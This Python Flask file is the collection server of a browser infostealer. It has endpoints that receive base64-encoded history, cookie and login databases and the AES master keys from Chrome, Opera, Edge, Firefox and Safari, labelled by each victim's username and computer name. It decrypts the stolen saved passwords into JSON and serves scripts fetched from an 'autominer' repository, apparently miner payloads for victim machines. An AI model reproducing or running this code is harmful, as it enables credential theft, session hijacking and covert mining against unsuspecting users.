import flask
import time
import json
import base64
import sqlite3
import requests
import win32crypt  # type: ignore
from Cryptodome.Cipher import AES
from datetime import datetime, timedelta
from flask import request
app = flask.Flask(__name__)


def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        return str(e)


def decrypt(filename, key):
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    data = []
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        if user_name or decrypted_password:
            data.append([main_url, login_page_url,
                        user_name, decrypted_password])
        else:
            continue
    cursor.close()
    db.close()
    return data


@app.route('/saveHistory', methods=['POST'])
def saveChromeHistory():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "ChromeHistory" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./dbs/"+filename+".sqlite", "wb") as f:
            f.write(txt)
        con = sqlite3.connect("./dbs/"+filename+".sqlite")
        cur = con.cursor()
        cur = cur.execute("SELECT * FROM 'urls'")
        # save as json
        with open("./data/"+filename+".json", "w") as f:
            json.dump(cur.fetchall(), f)
        cur.close()
        con.close()
        return "ok"


@app.route('/saveLoginData', methods=['POST'])
def saveLoginData():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "ChromeLoginData" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./dbs/"+filename+".sqlite", "wb") as f:
            f.write(txt)
        # print(txt)
        return "ok"


@app.route('/saveCookie', methods=['POST'])
def saveCookie():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "ChromeCookie" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./dbs/"+filename+".sqlite", "wb") as f:
            f.write(txt)
        # print(txt)
        return "ok"
    
@app.route('/saveOperaCookie', methods=['POST'])
def saveOperaCookie():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "OperaCookie" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./dbs/"+filename+".sqlite", "wb") as f:
            f.write(txt)
        # print(txt)
        return "ok"


@app.route('/saveAesKey', methods=['POST'])
def saveAesKey():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        key = data['masterKey']
        username = data['username']
        name=data['name']
        ComputerName = data['ComputerName']
        key = key.split("\n")[0]
        key = base64.b64decode(key)
        filename = "ChromeAESKey" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./aesKey/"+filename+".aeskey", "wb") as f:
            f.write(key)
        # print(txt)
        return "ok"
    
@app.route('/saveOperaAesKey', methods=['POST'])
def saveOperaAesKey():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        key = data['masterKey']
        username = data['username']
        name=data['name']
        ComputerName = data['ComputerName']
        key = key.split("\n")[0]
        key = base64.b64decode(key)
        filename = "OperaAESKey" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./aesKey/"+filename+".aeskey", "wb") as f:
            f.write(key)
        # print(txt)
        return "ok"

@app.route('/saveJson', methods=['POST'])
def saveJson():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        key = data['data']
        username = data['username']
        ComputerName = data['ComputerName']
        key = base64.b64decode(key)
        filename = "./Json/"+ \
            str(int(time.time()))+"-"+username+"-"+ComputerName
        with open(filename+".json", "wb") as f:
            f.write(key)
        return "ok"

@app.route('/saveSavedPasswords', methods=['POST'])
def saveSavedPasswords():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['db']
        key = data['masterKey']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        key = key.split("\n")[0]
        key = base64.b64decode(key)
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "ChromeLoginData" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./dbs/"+filename+".sqlite", "wb") as f:
            f.write(txt)
        password = decrypt("./dbs/"+filename+".sqlite", key)
        with open("./data/"+filename+".json", "w") as f:
            json.dump(password, f)
        return "ok"

@app.route('/saveOperaSavedPasswords', methods=['POST'])
def saveOperaSavedPasswords():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['db']
        key = data['masterKey']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        key = key.split("\n")[0]
        key = base64.b64decode(key)
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "OperaLoginData" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./dbs/"+filename+".sqlite", "wb") as f:
            f.write(txt)
        password = decrypt("./dbs/"+filename+".sqlite", key)
        with open("./data/"+filename+".json", "w") as f:
            json.dump(password, f)
        return "ok"

@app.route('/saveSafariHistory', methods=['POST'])
def saveSafariHistory():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "SafariHistory" + \
            str(int(time.time()))+username+"-"+ComputerName
        with open("./dbs/"+filename+".sqlite", "wb") as f:
            f.write(txt)
        con = sqlite3.connect("./dbs/"+filename+".sqlite")
        cur = con.cursor()
        cur = cur.execute("SELECT * FROM history_items;")
        # save as json
        dat=cur.fetchall()
        dat=[list(map(str, x)) for x in dat]
        with open("./data/"+filename+".json", "w") as f:
            json.dump(dat, f,ensure_ascii=False)
        cur.close()
        con.close()
        # print(txt)
        return "ok"

@app.route('/saveOperaHistory', methods=['POST'])
def saveOperaHistory():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "OperaHistory" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./dbs/"+filename+".sqlite", "wb") as f:
            f.write(txt)
        con = sqlite3.connect("./dbs/"+filename+".sqlite")
        cur = con.cursor()
        cur = cur.execute("SELECT * FROM 'urls'")
        # save as json
        with open("./data/"+filename+".json", "w") as f:
            json.dump(cur.fetchall(), f)
        cur.close()
        con.close()
        return "ok"


@app.route('/saveFirefoxHistory', methods=['POST'])
def saveFirefoxHistory():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "FirefoxHistory" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./dbs/"+filename+".sqlite", "wb") as f:
            f.write(txt)
        con = sqlite3.connect("./dbs/"+filename+".sqlite")
        cur = con.cursor()
        cur = cur.execute("SELECT * FROM moz_places;")
        # save as json
        with open("./data/"+filename+".json", "w") as f:
            json.dump(cur.fetchall(), f)
        cur.close()
        con.close()
        return "ok"
@app.route('/saveEdgeHistory', methods=['POST'])
def saveEdgeHistory():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "EdgeHistory" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open("./dbs/"+filename+".sqlite", "wb") as f:
            f.write(txt)
        con = sqlite3.connect("./dbs/"+filename+".sqlite")
        cur = con.cursor()
        cur = cur.execute("SELECT * FROM 'urls'")
        # save as json
        with open("./data/"+filename+".json", "w") as f:
            json.dump(cur.fetchall(), f)
        cur.close()
        con.close()
        return "ok"
@app.route('/get')
def get():
    return requests.get("https://raw.githubusercontent.com/zlc1004/autominer/main/get").text

@app.route('/mac')
def mac():
    return requests.get("https://raw.githubusercontent.com/zlc1004/autominer/main/mac.sh").text

app.run(host='0.0.0.0', port="50000")
